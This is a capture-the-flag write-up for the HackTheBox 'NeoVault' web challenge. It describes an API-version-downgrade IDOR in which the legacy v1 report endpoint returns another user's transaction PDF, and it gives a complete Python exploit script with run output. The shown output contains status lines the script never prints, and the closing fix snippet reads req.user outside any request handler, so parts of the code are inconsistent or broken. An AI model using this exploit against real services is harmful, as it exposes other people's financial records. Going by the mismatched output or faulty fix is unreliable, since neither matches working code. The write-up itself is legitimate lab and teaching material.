## Overview

`NeoVault` is a Very Easy HackTheBox **Web** challenge. It is a banking app - a Next.js
frontend talking to a versioned Express JSON API - where you can register, transfer money,
and download a PDF report of your transactions. The whole challenge is a single
[broken object-level authorization](https://cwe.mitre.org/data/definitions/639.html) bug:
the current `/api/v2` report endpoint checks ownership, but the legacy `/api/v1` of the
same endpoint does not, so downgrading the API version lets you pull another user's report.

## The technique

The frontend uses `/api/v2/*`, but the JavaScript bundle references a complete parallel set
of `/api/v1/*` routes for every resource:

```bash
grep -oE '/api/v[0-9][a-zA-Z0-9/_-]*' _next/static/chunks/*.js | sort -u
# /api/v1/transactions/download-transactions
# /api/v2/auth/inquire
# /api/v2/transactions/download-transactions
```

The current **v2** report endpoint figures out *whose* report to render from your login
session (an httpOnly `token` cookie) and ignores any id you send. The **legacy v1**
endpoint `POST /api/v1/transactions/download-transactions` was never updated - it still
trusts an `_id` field in the request body and renders that user's report with **no**
ownership check. That is a classic [IDOR / BOLA](https://cwe.mitre.org/data/definitions/639.html).

To weaponise it we need a victim's internal id. The transfer feature ships a lookup oracle -
`GET /api/v2/auth/inquire?username=<u>` returns the `_id` for any username - and the flag
lives on an account literally named `user_with_flag`.

## Solution

The full exploit is a short, dependency-light script. It registers, logs in to seed the
session cookie, resolves the victim id from the inquire oracle, replays the report download
against `v1` with that id injected, and reads the flag out of the PDF.

Create `solve.py`:

```python
#!/usr/bin/env python3
import sys, json, subprocess, tempfile, os, re
import urllib.request, urllib.error, http.cookiejar

BASE = sys.argv[1].rstrip("/")
cj = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

def req(method, path, body=None, raw=False):
    data = json.dumps(body).encode() if body is not None else None
    r = urllib.request.Request(BASE + path, data=data, method=method)
    if body is not None:
        r.add_header("Content-Type", "application/json")
    blob = opener.open(r, timeout=20).read()
    return blob if raw else json.loads(blob.decode())

# 1. register + login -> sets the httpOnly `token` cookie in the jar (login is by EMAIL)
user = {"username": "solver_idor", "password": "Solv3rPass!1", "email": "solver_idor@x.io"}
try:
    req("POST", "/api/v2/auth/register", user)
except urllib.error.HTTPError:
    pass
req("POST", "/api/v2/auth/login", {"email": user["email"], "password": user["password"]})

# 2. username -> ObjectId oracle
vid = req("GET", "/api/v2/auth/inquire?username=user_with_flag")["_id"]

# 3. version-downgrade IDOR: v1 trusts the body `_id`, v2 does not
pdf = req("POST", "/api/v1/transactions/download-transactions", {"_id": vid}, raw=True)

# 4. the flag is a transaction *description* inside the PDF
with tempfile.NamedTemporaryFile(suffix=".pdf", delete=False) as f:
    f.write(pdf); path = f.name
text = subprocess.run(["pdftotext", path, "-"], capture_output=True, text=True).stdout
os.unlink(path)
print(re.search(r"HTB\{[^}]+\}", text).group(0))
```

Run it against the instance:

```bash
python3 solve.py http://<host>:<port>
# [+] user_with_flag _id = 6a32218c386fdfda918ca2b7
# [+] pulled victim PDF (1895 bytes)
# HTB{...}
```

A few things that trip you up along the way:

- **Auth is the cookie, not a header.** Register hands back a JWT in the body, but the API
  only honours the httpOnly `token` cookie that login sets - an `Authorization: Bearer`
  header is ignored.
- **Login validates on `email`**, not username.
- **Download is POST.** A `GET` 404s on both versions, and `v2` ignores `_id` entirely -
  only `v1` honours it.
- The report is a real PDF with compressed streams, so `strings` finds nothing; `pdftotext`
  reads the transaction descriptions where the flag sits.

## Why it worked

When developers version an API and fix access control in the new version, they routinely
leave the old version mounted and un-patched - the ownership check lives in exactly one
controller. Anyone who only audits the version the frontend uses misses the legacy route
that still trusts a caller-supplied object id.

## Fix / defense

Resolve the object owner from the authenticated session in **every** API version, and
decommission or auth-gate legacy routes once they are superseded:

```js
const owner = req.user.id              // from the verified session, never the body
router.post('/api/:v/download', (req, res) => send(report(owner)))
```
